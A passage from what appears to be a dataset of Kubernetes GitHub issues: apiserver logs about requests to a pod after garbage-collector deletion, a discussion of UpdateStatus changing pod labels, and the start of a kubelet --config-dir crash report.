\u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0\n2025-02-03 15:11:26 | I0203 09:41:25.677514\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a01 httplog.go:132] \"HTTP\" verb=\"PATCH\" URI=\"/api/v1/namespaces/genctl/pods/acadia-image-eviction-job-28976255-cc47j/status\" latency=\"6.528678ms\" userAgent=\"kubelet/v1.29.9 (linux/amd64) kubernetes/114a1f5\" audit-ID=\"2aa3844b-54e8-4c07-9609-67c764434fe9\" srcIP=\"10.51.170.59:49600\" apf_pl=\"system\" apf_fs=\"system-nodes\" apf_iseats=1 apf_fseats=0 apf_additionalLatency=\"0s\" apf_execution_time=\"6.230063ms\" resp=200 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0\n2025-02-03 15:11:26 | Processing complete for resource with update | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0\n2025-02-03 15:11:26 | Processing starting for resource | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0\n2025-02-03 15:11:28 | \"Args\": \"IgnoreUnknown=1;K8S_POD_NAMESPACE=genctl;K8S_POD_NAME=acadia-image-eviction-job-28976255-cc47j;K8S_POD_INFRA_CONTAINER_ID=9a713f63594532d108d1debd3f7498756b7a4c12210aacd9fb2c2270de1d1691;K8S_POD_UID=d20d4043-6ff1-4143-8b86-26e6681bde12\", | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0\n2025-02-03 15:11:28 | CNI_Plugin: 258: 9a713f63594532d1: CNI_ARGS=IgnoreUnknown=1;K8S_POD_NAMESPACE=genctl;K8S_POD_NAME=acadia-image-eviction-job-28976255-cc47j;K8S_POD_INFRA_CONTAINER_ID=9a713f63594532d108d1debd3f7498756b7a4c12210aacd9fb2c2270de1d1691;K8S_POD_UID=d20d4043-6ff1-4143-8b86-26e6681bde12 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0\n2025-02-03 15:11:28 | I0203 09:41:28.055114\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a01 httplog.go:132] \"HTTP\" verb=\"GET\" URI=\"/api/v1/namespaces/genctl/pods/acadia-image-eviction-job-28976255-cc47j\" latency=\"2.363212ms\" userAgent=\"kubelet/v1.29.9 (linux/amd64) kubernetes/114a1f5\" audit-ID=\"b9a41cd3-5d78-481d-be24-698752c936e1\" srcIP=\"10.51.170.59:49600\" apf_pl=\"system\" apf_fs=\"system-nodes\" apf_iseats=1 apf_fseats=0 apf_additionalLatency=\"0s\" apf_execution_time=\"1.832538ms\" resp=200 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0\n2025-02-03 15:11:28 | I0203 09:41:28.063121\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a01 httplog.go:132] \"HTTP\" verb=\"PATCH\" URI=\"/api/v1/namespaces/genctl/pods/acadia-image-eviction-job-28976255-cc47j/status\" latency=\"7.116743ms\" userAgent=\"kubelet/v1.29.9 (linux/amd64) kubernetes/114a1f5\" audit-ID=\"7855db5f-af62-4331-a41f-cc0d4da3bfb1\" srcIP=\"10.51.170.59:49600\" apf_pl=\"system\" apf_fs=\"system-nodes\" apf_iseats=1 apf_fseats=0 apf_additionalLatency=\"0s\" apf_execution_time=\"6.798459ms\" resp=200 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0\n2025-02-03 15:11:28 | Processing starting for resource | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0\n2025-02-03 15:11:28 | Processing complete for resource with update | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0\n2025-02-03 15:11:29 | I0203 09:41:28.693245\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a01 httplog.go:132] \"HTTP\" verb=\"GET\" URI=\"/api/v1/namespaces/genctl/pods/acadia-image-eviction-job-28976255-cc47j\" latency=\"1.953523ms\" userAgent=\"kubelet/v1.29.9 (linux/amd64) kubernetes/114a1f5\" audit-ID=\"26aea5a3-739b-413b-bae6-9d87ae5547fb\" srcIP=\"10.51.170.59:49600\" apf_pl=\"system\" apf_fs=\"system-nodes\" apf_iseats=1 apf_fseats=0 apf_additionalLatency=\"0s\" apf_execution_time=\"1.750709ms\" resp=200 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0\n2025-02-03 15:11:29 | I0203 09:41:29.078344\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a01 httplog.go:132] \"HTTP\" verb=\"PATCH\" URI=\"/api/v1/namespaces/genctl/pods/acadia-image-eviction-job-28976255-cc47j\" latency=\"7.768549ms\" userAgent=\"kube-controller-manager/v1.29.9 (linux/amd64) kubernetes/114a1f5/system:serviceaccount:kube-system:job-controller\" audit-ID=\"54e91ace-9844-4232-9eb9-967f7cc21d12\" srcIP=\"11.105.4.2:56082\" apf_pl=\"workload-high\" apf_fs=\"kube-system-service-accounts\" apf_iseats=1 apf_fseats=0 apf_additionalLatency=\"0s\" apf_execution_time=\"7.461448ms\" resp=200 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0\n2025-02-03 15:11:29 | Processing starting for resource | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0\n2025-02-03 15:11:29 | Processing complete for resource with update | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0\n2025-02-03 15:11:47 | I0203 09:41:46.559173\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a01 garbagecollector.go:549] \"Processing item\" item=\"[v1/Pod, namespace: genctl, name: acadia-image-eviction-job-28976255-cc47j, uid: d20d4043-6ff1-4143-8b86-26e6681bde12]\" virtual=false | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0\n2025-02-03 15:11:47 | I0203 09:41:46.561384\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a01 garbagecollector.go:688] \"Deleting item\" item=\"[v1/Pod, namespace: genctl, name: acadia-image-eviction-job-28976255-cc47j, uid: d20d4043-6ff1-4143-8b86-26e6681bde12]\" propagationPolicy=\"Background\" | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0\n2025-02-03 15:11:47 | I0203 09:41:46.561184\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a01 httplog.go:132] \"HTTP\" verb=\"GET\" URI=\"/api/v1/namespaces/genctl/pods/acadia-image-eviction-job-28976255-cc47j\" latency=\"1.723412ms\" userAgent=\"kube-controller-manager/v1.29.9 (linux/amd64) kubernetes/114a1f5/system:serviceaccount:kube-system:generic-garbage-collector\" audit-ID=\"dfcb6166-3adf-4488-abbe-534e7b5cacd3\" srcIP=\"11.105.4.2:56082\" apf_pl=\"workload-high\" apf_fs=\"kube-system-service-accounts\" apf_iseats=1 apf_fseats=0 apf_additionalLatency=\"0s\" apf_execution_time=\"1.42406ms\" resp=200 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0\n2025-02-03 15:11:47 | Processing starting for resource | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0\n2025-02-03 15:11:47 | Processing complete for resource with update | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0\n2025-02-03 15:11:47 | I0203 09:41:46.569516\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a01 httplog.go:132] \"HTTP\" verb=\"DELETE\" URI=\"/api/v1/namespaces/genctl/pods/acadia-image-eviction-job-28976255-cc47j\" latency=\"5.304571ms\" userAgent=\"kube-controller-manager/v1.29.9 (linux/amd64) kubernetes/114a1f5/system:serviceaccount:kube-system:generic-garbage-collector\" audit-ID=\"de96766b-c42c-4843-a0f4-a765a4bbf384\" srcIP=\"11.105.4.2:19620\" apf_pl=\"workload-high\" apf_fs=\"kube-system-service-accounts\" apf_iseats=1 apf_fseats=0 apf_additionalLatency=\"0s\" apf_execution_time=\"5.074275ms\" resp=200 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0\n2025-02-03 15:12:06 | CNI_Plugin: 258: 9a713f63594532d1: CNI_ARGS=K8S_POD_INFRA_CONTAINER_ID=9a713f63594532d108d1debd3f7498756b7a4c12210aacd9fb2c2270de1d1691;K8S_POD_UID=d20d4043-6ff1-4143-8b86-26e6681bde12;IgnoreUnknown=1;K8S_POD_NAMESPACE=genctl;K8S_POD_NAME=acadia-image-eviction-job-28976255-cc47j | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0\n2025-02-03 15:12:06 | \"Args\": \"K8S_POD_INFRA_CONTAINER_ID=9a713f63594532d108d1debd3f7498756b7a4c12210aacd9fb2c2270de1d1691;K8S_POD_UID=d20d4043-6ff1-4143-8b86-26e6681bde12;IgnoreUnknown=1;K8S_POD_NAMESPACE=genctl;K8S_POD_NAME=acadia-image-eviction-job-28976255-cc47j\", | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0\n2025-02-03 15:12:06 | CNI_Plugin: 258: 9a713f63594532d1: CNI_ARGS=K8S_POD_NAME=acadia-image-eviction-job-28976255-cc47j;K8S_POD_INFRA_CONTAINER_ID=9a713f63594532d108d1debd3f7498756b7a4c12210aacd9fb2c2270de1d1691;K8S_POD_UID=d20d4043-6ff1-4143-8b86-26e6681bde12;IgnoreUnknown=1;K8S_POD_NAMESPACE=genctl | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0\n2025-02-03 15:12:06 | \"Args\": \"K8S_POD_NAME=acadia-image-eviction-job-28976255-cc47j;K8S_POD_INFRA_CONTAINER_ID=9a713f63594532d108d1debd3f7498756b7a4c12210aacd9fb2c2270de1d1691;K8S_POD_UID=d20d4043-6ff1-4143-8b86-26e6681bde12;IgnoreUnknown=1;K8S_POD_NAMESPACE=genctl\", | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0\n2025-02-03 20:59:35 | I0203 15:29:35.210000\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a01 httplog.go:132] \"HTTP\" verb=\"GET\" URI=\"/apis/apps/v1/namespaces/genctl/deployments/acadia-image-eviction-job-28976255-cc47j\" latency=\"1.988411ms\" userAgent=\"kubectl/v1.25.14 (linux/amd64) kubernetes/a5967a3\" audit-ID=\"e9ffac2d-b409-49cc-92ef-7ccb403dd622\" srcIP=\"10.249.6.203:29282\" apf_pl=\"global-default\" apf_fs=\"global-default\" apf_iseats=1 apf_fseats=0 apf_additionalLatency=\"0s\" apf_execution_time=\"1.756783ms\" resp=404 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0\n2025-02-03 20:59:59 | I0203 15:29:59.049271\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a01 httplog.go:132] \"HTTP\" verb=\"GET\" URI=\"/apis/apps/v1/namespaces/genctl/deployments/acadia-image-eviction-job-28976255-cc47j\" latency=\"1.726691ms\" userAgent=\"kubectl/v1.25.14 (linux/amd64) kubernetes/a5967a3\" audit-ID=\"71387662-af3e-4f3a-93c9-fbe64bfde903\" srcIP=\"10.249.6.203:25434\" apf_pl=\"global-default\" apf_fs=\"global-default\" apf_iseats=1 apf_fseats=0 apf_additionalLatency=\"0s\" apf_execution_time=\"1.464775ms\" resp=404 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0\n2025-02-04 23:26:22 | I0204 17:56:21.752231\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a01 httplog.go:132] \"HTTP\" verb=\"GET\" URI=\"/api/v1/namespaces/genctl/pods/acadia-image-eviction-job-28976255-cc47j\" latency=\"2.0842ms\" userAgent=\"kubectl/v1.25.14 (linux/amd64) kubernetes/a5967a3\" audit-ID=\"039faa17-d98d-4324-b5e9-48f9bff8ffae\" srcIP=\"10.249.6.203:13196\" apf_pl=\"global-default\" apf_fs=\"global-default\" apf_iseats=1 apf_fseats=0 apf_additionalLatency=\"0s\" apf_execution_time=\"1.862127ms\" resp=404 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0 | \u00a0\n\n\n```\n\n### What did you expect to happen?\n\nAfter the Pod has been deleted by garbage collector, K8s should not make any GET call on that Pod\n\n### How can we reproduce it (as minimally and precisely as possible)?\n\nThis issue is not easily reproducible, but it tends to occur approximately every two months.\nIf possible, please consider the following steps to investigate further:\nCreate a CronJob with the ```ttlSecondsAfterFinished: 86400``` setting.\nObserve how and when the Kubernetes garbage collector deletes the corresponding Pod, Job, and CronJob resources.\nMonitor whether any GET requests are being made to the specific Pod during or after its lifecycle.\n\n### Anything else we need to know?\n\n_No response_\n\n### Kubernetes version\n\n<details>\n\n```console\n$ kubectl version\n# v1.29.9\n```\n\n</details>\n\n\n### Cloud provider\n\n<details>\n\n</details>\n\n\n### OS version\n\n<details>\n\n```console\n# On Linux:\n$ cat /etc/os-release\n# paste output here\n$ uname -a\n# paste output here\n\n# On Windows:\nC:\\> wmic os get Caption, Version, BuildNumber, OSArchitecture\n# paste output here\n```\n\n</details>\n\n\n### Install tools\n\n<details>\n\n</details>\n\n\n### Container runtime (CRI) and version (if applicable)\n\n<details>\n\n</details>\n\n\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\n\n<details>\n\n</details>\n", "issue_labels": ["kind/bug", "needs-sig", "lifecycle/rotten", "needs-triage"], "comments": [{"author": "k8s-ci-robot", "body": "There are no sig labels on this issue. Please add an appropriate label by using one of the following commands:\n- `/sig <group-name>`\n- `/wg <group-name>`\n- `/committee <group-name>`\n\nPlease see the [group list](https://git.k8s.io/community/sig-list.md) for a listing of the SIGs, working groups, and committees available.\n\n\n<details>\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "k8s-ci-robot", "body": "This issue is currently awaiting triage.\n\nIf a SIG or subproject determines this is a relevant issue, they will accept it by applying the `triage/accepted` label and provide further guidance.\n\nThe `triage/accepted` label can be added by org members by writing `/triage accepted` in a comment.\n\n\n<details>\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough contributors to adequately respond to all issues.\n\nThis bot triages un-triaged issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue as fresh with `/remove-lifecycle stale`\n- Close this issue with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle stale\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough active contributors to adequately respond to all issues.\n\nThis bot triages un-triaged issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue as fresh with `/remove-lifecycle rotten`\n- Close this issue with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle rotten\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough active contributors to adequately respond to all issues and PRs.\n\nThis bot triages issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Reopen this issue with `/reopen`\n- Mark this issue as fresh with `/remove-lifecycle rotten`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/close not-planned\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-ci-robot", "body": "@k8s-triage-robot: Closing this issue, marking it as \"Not Planned\".\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/131287#issuecomment-3279697140):\n\n>The Kubernetes project currently lacks enough active contributors to adequately respond to all issues and PRs.\n>\n>This bot triages issues according to the following rules:\n>- After 90d of inactivity, `lifecycle/stale` is applied\n>- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n>- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n>\n>You can:\n>- Reopen this issue with `/reopen`\n>- Mark this issue as fresh with `/remove-lifecycle rotten`\n>- Offer to help out with [Issue Triage][1]\n>\n>Please send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n>\n>/close not-planned\n>\n>[1]: https://www.kubernetes.dev/docs/guide/issue-triage/\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 92022, "issue_url": "https://github.com/kubernetes/kubernetes/issues/92022", "issue_title": "UpdateStatus func would also update label and annotations", "issue_author": "cwdsuzhou", "issue_body": "<!-- Please use this template while reporting a bug and provide as much info as possible. Not doing so may result in your bug not being addressed in a timely manner. Thanks!\r\n\r\nIf the matter is security related, please disclose it privately via https://kubernetes.io/security/\r\n-->\r\n\r\n\r\n**What happened**:\r\n\r\nWhen we use UpdateStatus to update pod, we found pod label also updated. Is that by design?\r\n\r\n**What you expected to happen**:\r\n\r\nonly update pod status\r\n\r\n**How to reproduce it (as minimally and precisely as possible)**:\r\n\r\n**Anything else we need to know?**:\r\n\r\nhttps://github.com/kubernetes/kubernetes/blob/master/pkg/registry/core/pod/strategy.go#L163-168\r\n\r\nwe do not ignore label and annotations\r\n\r\n**Environment**:\r\n- Kubernetes version (use `kubectl version`):\r\n- Cloud provider or hardware configuration:\r\n- OS (e.g: `cat /etc/os-release`):\r\n- Kernel (e.g. `uname -a`):\r\n- Install tools:\r\n- Network plugin and version (if this is a network-related bug):\r\n- Others:\r\n", "issue_labels": ["kind/bug", "sig/api-machinery"], "comments": [{"author": "cwdsuzhou", "body": "/sig api"}, {"author": "k8s-ci-robot", "body": "@cwdsuzhou: The label(s) `sig/api` cannot be applied, because the repository doesn't have them\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/92022#issuecomment-642453284):\n\n>/sig api\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes/test-infra](https://github.com/kubernetes/test-infra/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "cwdsuzhou", "body": "/sig api-server"}, {"author": "k8s-ci-robot", "body": "@cwdsuzhou: The label(s) `sig/api-server` cannot be applied, because the repository doesn't have them\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/92022#issuecomment-642453421):\n\n>/sig api-server\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes/test-infra](https://github.com/kubernetes/test-infra/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "cwdsuzhou", "body": "/sig api-machinery"}, {"author": "liggitt", "body": "The original approach to subresources was only concerned with preventing changes to spec and status via the respective endpoints. Changes to metadata were allowed via either endpoint. That is the case for most of the types defined early on in Kubernetes. \r\n\r\nChanges to metadata via status subresources were restricted in some later types, notably custom resource types. \r\n\r\n"}, {"author": "Danny-Wei", "body": "> The original approach to subresources was only concerned with preventing changes to spec and status via the respective endpoints. Changes to metadata were allowed via either endpoint. That is the case for most of the types defined early on in Kubernetes.\n> \n> Changes to metadata via status subresources were restricted in some later types, notably custom resource types.\n\nHi @liggitt, I would like to ask if there are any plans to adjust the metadata modification permission rules for core resources such as Pods and Nodes in the future?\n\nA common scenario is that many DaemonSet components need to modify the annotations or labels of Pods or Nodes. Under the earlier rules, we only needed to grant permissions for `nodes/status` or `pods/status` to enable these operations, which effectively narrowed the scope of sensitive permissions and minimized their spread.\n\nHowever, if metadata modifications for core resources like Pods and Nodes are also restricted (following the later rule applied to custom resources), it will become inevitable to expand the permission scopes, undermining the goal of limiting the diffusion of sensitive permissions."}, {"author": "liggitt", "body": "There are no plans to modify the behavior of older resources like pods and nodes here"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 124796, "issue_url": "https://github.com/kubernetes/kubernetes/issues/124796", "issue_title": "bug: kubelet panic & crash if `--config-dir` is used", "issue_author": "hegerdes", "issue_body": "### What happened?\r\n\r\nI created a v1.30.0 k8s cluster with kubeadm and created a  drop-in directory for kubelet configuration under `/etc/kubernetes/kubelet.conf.d`. The normal conf file created by kubeadm is in ` /var/lib/kubelet/config.yaml`\r\n\r\nAccording to the [docs](https://kubernetes.io/docs/tasks/administer-cluster/kubelet-config-file/#kubelet-conf-d) the kubelet should merge all configs in specified order and start. But the kubelet crashes under two setups:\r\n\r\n**Setup 1**:\r\n\r\nThe `/etc/kubernetes/kubelet.conf.d/20-kubelet.conf` is completely empty the kubelet crashes with:\r\n```\r\n>kubelet --config-dir /etc/kubernetes/kubelet.conf.d --config /var/lib/kubelet/config.yaml\r\nE0510 13:47:28.749138    9050 run.go:74] \"command failed\" err=\"failed to merge kubelet configs: failed to walk through kubelet dropin directory \\\"/etc/kubernetes/kubelet.conf.d\\\": failed to load kubelet dropin file, path: /etc/kubernetes/kubelet.conf.d/20-kubelet.conf, error: kubelet config file \\\"/etc/kubernetes/kubelet.conf.d/20-kubelet.conf\\\" was empty\"\r\n```\r\nIf there is 